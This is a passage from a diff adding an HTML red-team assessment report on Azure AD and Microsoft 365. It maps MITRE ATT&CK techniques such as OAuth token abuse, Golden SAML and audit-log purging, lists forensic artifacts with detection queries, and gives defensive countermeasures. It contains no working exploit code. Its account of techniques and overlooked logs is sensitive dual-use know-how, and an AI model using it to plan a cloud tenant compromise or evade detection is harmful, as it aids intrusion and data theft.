+          <td><span class="severity high">HIGH</span></td>
+          <td>Inbox rules, delegates, and mail transport rule manipulation</td>
+        </tr>
+        <tr>
+          <td><span class="mitre-id">T1550.001</span></td>
+          <td>Application Access Token Abuse</td>
+          <td>Lateral Movement</td>
+          <td><span class="severity critical">CRITICAL</span></td>
+          <td>OAuth tokens used to pivot to federated SaaS platforms</td>
+        </tr>
+        <tr>
+          <td><span class="mitre-id">T1078.004</span></td>
+          <td>Valid Accounts: Cloud Accounts</td>
+          <td>Persistence</td>
+          <td><span class="severity high">HIGH</span></td>
+          <td>Compromised or attacker-created accounts in Azure AD</td>
+        </tr>
+        <tr>
+          <td><span class="mitre-id">T1114.002</span></td>
+          <td>Remote Email Collection</td>
+          <td>Collection</td>
+          <td><span class="severity high">HIGH</span></td>
+          <td>Graph API mailbox access via application permissions</td>
+        </tr>
+        <tr>
+          <td><span class="mitre-id">T1606.002</span></td>
+          <td>Forge Web Credentials: SAML Tokens</td>
+          <td>Credential Access</td>
+          <td><span class="severity critical">CRITICAL</span></td>
+          <td>Golden SAML — requires token-signing certificate compromise</td>
+        </tr>
+        <tr>
+          <td><span class="mitre-id">T1537</span></td>
+          <td>Transfer Data to Cloud Account</td>
+          <td>Exfiltration</td>
+          <td><span class="severity high">HIGH</span></td>
+          <td>SharePoint/OneDrive bulk download via Graph API</td>
+        </tr>
+        <tr>
+          <td><span class="mitre-id">T1562.008</span></td>
+          <td>Disable or Modify Cloud Logs</td>
+          <td>Defense Evasion</td>
+          <td><span class="severity critical">CRITICAL</span></td>
+          <td>Disabling UAL or purging audit logs to cover tracks</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ═══════════════ Q3: ARTIFACTS ═══════════════ -->
+<section class="section">
+  <div class="section-header">
+    <span class="section-number">05</span>
+    <h2 class="section-title">Forensic Artifacts Surviving Cleanup</h2>
+  </div>
+
+  <div class="artifact-grid">
+    <div class="artifact-card">
+      <div class="artifact-header">
+        <div class="artifact-icon log">📋</div>
+        <h4>Azure AD Sign-In Logs</h4>
+      </div>
+      <div class="artifact-body">
+        <p>Sign-in logs retain entries for 30 days (P1/P2 license). Even after cleanup, they capture: IP addresses, user agents, application IDs, conditional access evaluation results, token issuance events, and MFA method details. Service principal sign-ins are logged separately and often overlooked during cleanup.</p>
+        <span class="artifact-path">Azure Portal → Azure AD → Sign-in logs (User + Service Principal tabs)</span>
+      </div>
+    </div>
+
+    <div class="artifact-card">
+      <div class="artifact-header">
+        <div class="artifact-icon token">🔑</div>
+        <h4>Azure AD Audit Logs</h4>
+      </div>
+      <div class="artifact-body">
+        <p>Captures <strong>all</strong> directory changes: app registration modifications, credential additions, role assignments, consent grants, policy changes. Even if the attacker removes their backdoor, the "Add service principal credentials" and "Consent to application" events persist with full actor attribution and timestamps.</p>
+        <span class="artifact-path">AuditLogs | where OperationName in ("Add service principal credentials", "Consent to application", "Add member to role")</span>
+      </div>
+    </div>
+
+    <div class="artifact-card">
+      <div class="artifact-header">
+        <div class="artifact-icon reg">📊</div>
+        <h4>Unified Audit Log (M365)</h4>
+      </div>
+      <div class="artifact-body">
+        <p>The UAL records mailbox access (MailItemsAccessed), file downloads (FileDownloaded), inbox rule creation (New-InboxRule), eDiscovery searches, and consent events. Retained for 90 days (E3) to 1 year (E5). Even if an attacker deletes their inbox rule, the creation event remains in UAL.</p>
+        <span class="artifact-path">Search-UnifiedAuditLog -Operations "MailItemsAccessed","New-InboxRule","Add-MailboxPermission","Consent to application"</span>
+      </div>
+    </div>
+
+    <div class="artifact-card">
+      <div class="artifact-header">
+        <div class="artifact-icon mail">📧</div>
+        <h4>OAuth App Consent Records</h4>
+      </div>
+      <div class="artifact-body">
+        <p>Enterprise Applications in Azure AD retain records of which users consented to which applications and when. The OAuth2PermissionGrants and appRoleAssignments on service principals show granted scopes. Even after app deletion, audit log entries for the consent event survive with the application ID.</p>
+        <span class="artifact-path">GET /oauth2PermissionGrants | GET /servicePrincipals/{id}/appRoleAssignments</span>
+      </div>
+    </div>
+
+    <div class="artifact-card">
+      <div class="artifact-header">
+        <div class="artifact-icon alert">⚠️</div>
+        <h4>Cloud App Security / Defender for Cloud Apps</h4>
+      </div>
+      <div class="artifact-body">
+        <p>If MDA is deployed, it independently logs OAuth app activity, impossible travel detections, suspicious inbox rules, mass file downloads, and anomalous Graph API call patterns. These logs persist in MDA's own storage and cannot be tampered with from the compromised tenant alone.</p>
+        <span class="artifact-path">Microsoft Defender Portal → Cloud Apps → Activity Log + OAuth Apps</span>
+      </div>
+    </div>
+
+    <div class="artifact-card">
+      <div class="artifact-header">
+        <div class="artifact-icon log">🔒</div>
+        <h4>Token Issuance & CAE Events</h4>
+      </div>
+      <div class="artifact-body">
+        <p>Continuous Access Evaluation (CAE) events and token issuance records show when tokens were generated, from which IPs, for which resources, and whether they were issued via refresh token exchange (indicating token replay). These events are embedded in sign-in logs but often require specific query filters.</p>
+        <span class="artifact-path">SigninLogs | where AuthenticationProcessingDetails contains "Token Issuer" | where ResourceDisplayName != ""</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ DEFENSIVE RECOMMENDATIONS ═══════════════ -->
+<section class="section">
+  <div class="section-header">
+    <span class="section-number">06</span>
+    <h2 class="section-title">Defensive Countermeasures</h2>
+  </div>
+
+  <div class="defense-item">
+    <span class="defense-priority p1">P1 — CRITICAL</span>
+    <div class="defense-content">
+      <h4>Enforce Phishing-Resistant MFA (FIDO2 / Windows Hello)</h4>
+      <p>AiTM phishing completely neutralizes TOTP, SMS, and push-based MFA. Only hardware-bound, phishing-resistant authentication (FIDO2 security keys, Windows Hello for Business, or certificate-based authentication) prevents session token theft. Create a Conditional Access policy requiring authentication strength of "Phishing-resistant MFA" for all users on all cloud apps.</p>
+    </div>
+  </div>
+
+  <div class="defense-item">
+    <span class="defense-priority p1">P1 — CRITICAL</span>
+    <div class="defense-content">
+      <h4>Restrict OAuth Consent & App Governance</h4>
+      <p>Set "User consent for applications" to "Do not allow user consent." Require admin approval for all OAuth grants. Deploy App Governance (in Microsoft Defender for Cloud Apps) to monitor and auto-revoke high-privilege OAuth grants. Regularly audit Enterprise Applications for excessive permissions and unknown publishers.</p>
+    </div>
+  </div>
+
+  <div class="defense-item">
+    <span class="defense-priority p1">P1 — CRITICAL</span>
+    <div class="defense-content">
+      <h4>Monitor Service Principal Activity</h4>
+      <p>Alert on: new credentials added to app registrations/service principals, new federated identity credentials, service principal sign-ins from unusual IPs, and Graph API calls from service principals outside expected patterns. Ship service principal sign-in logs to SIEM — they are in a separate log category from user sign-ins and are often missed.</p>
+    </div>
+  </div>
+
+  <div class="defense-item">
+    <span class="defense-priority p2">P2 — HIGH</span>
+    <div class="defense-content">
+      <h4>Enforce Privileged Identity Management (PIM)</h4>
+      <p>Remove all standing Global Admin and Application Admin assignments. Require PIM activation with MFA, justification, and time-bound elevation (max 4 hours). Set up alerts for role activations and ensure approval workflows for critical roles. Audit custom role definitions for hidden escalation permissions.</p>
+    </div>
+  </div>
+
+  <div class="defense-item">
+    <span class="defense-priority p2">P2 — HIGH</span>
+    <div class="defense-content">
+      <h4>Block Legacy Authentication & Token Hardening</h4>
+      <p>Create a Conditional Access policy blocking all legacy authentication protocols. Reduce token lifetimes and enforce token binding where available. Enable Continuous Access Evaluation (CAE) to enable near-real-time revocation. Configure IP-based named locations and block token replay from outside trusted networks.</p>
+    </div>
+  </div>
+
+  <div class="defense-item">
+    <span class="defense-priority p3">P3 — STANDARD</span>
+    <div class="defense-content">
+      <h4>Log Everything & Hunt Proactively</h4>
+      <p>Enable Unified Audit Log, sign-in logs (user + SP), audit logs, and MailItemsAccessed (E5). Route all to SIEM with detections for: impossible travel, mass email access via Graph, new inbox rules with external forwarding, bulk file downloads from SharePoint, and anomalous app registration changes. Run monthly permission audits on all Enterprise Applications.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ FOOTER ═══════════════ -->
+<footer class="report-footer">
+  <p>RED TEAM ASSESSMENT — CONFIDENTIAL — AZURE AD / M365 / OAUTH ATTACK SURFACE</p>
+  <p style="margin-top: 8px; color: var(--text-dim);">Generated 2026-02-07 · MITRE ATT&CK v15 · Framework: Cloud-Native Kill Chain</p>
+</footer>
+
+</div>
+
+</body>
+</html>
